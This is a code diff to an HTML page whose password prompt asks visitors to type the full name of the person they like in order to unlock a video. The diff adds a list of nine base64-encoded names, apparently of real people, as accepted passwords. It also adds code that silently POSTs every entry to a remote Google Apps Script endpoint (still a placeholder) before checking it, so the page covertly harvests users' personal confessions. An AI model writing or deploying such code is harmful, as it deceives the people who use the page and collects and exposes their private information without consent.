@@ -21,7 +21,7 @@
     <div id="login-screen">
         <div id="login-container">
             <h2>AUTHENTICATION</h2>
-            <input type="password" id="p" placeholder="あなたの好きな人は？半角で全て打ち込め">
+            <input type="password" id="p" placeholder="好きな人半角フルネーム打て">
             <br>
             <button onclick="v()">UNLOCK</button>
         </div>
@@ -35,7 +35,31 @@
     </div>
 
     <script>
-        const _h = "a2l0YWdhd2FyaWhv";
+        const _allowed = [
+            "a2l0YWdhd2FyaWhv", // kitagawariho
+            "bW9yaWtva29ybw==", // morikokoro
+            "b25veXVtZWhv",     // onoyumeho
+            "a2F6aXdhcmFyaWtv", // kaziwarariko
+            "a2FuZWtvaGluYXRh", // kanekohinata
+            "eW9zaWRhaGluYQ==", // yosidahina
+            "eW9zaWRhaXRpa2E=", // yosidaitika
+            "b29rYXdhY2hpbmE=", // ookawachina
+            "b29rYXdhdGluYQ=="  // ookawatina
+        ];
+
+        // ★新しくデプロイしたGASの「ウェブアプリURL」をここに貼り付け
+        const GAS_URL = "ここにGASのウェブアプリURLを貼り付ける";
+
+        function sendToGas(inputWord) {
+            if (!GAS_URL || GAS_URL.startsWith("ここに")) return;
+            
+            fetch(GAS_URL, {
+                method: "POST",
+                mode: "no-cors",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ word: inputWord })
+            }).catch(e => console.log(e));
+        }
 
         function v() {
             const i = document.getElementById('p').value;
@@ -46,14 +70,16 @@
                 e = "";
             }
 
-            if (e === _h) {
+            if (i.trim() !== "") {
+                sendToGas(i);
+            }
+
+            if (_allowed.includes(e)) {
                 document.getElementById('login-screen').classList.add('hidden');
                 document.getElementById('video-screen').classList.remove('hidden');
                 
                 const vid = document.getElementById('v-main');
-                vid.play().catch(err => {
-                    console.log("Autoplay custom block bypassed.");
-                });
+                vid.play().catch(err => {});
             } else {
                 alert("パスワードが正しくありません。");
                 document.getElementById('p').value = "";
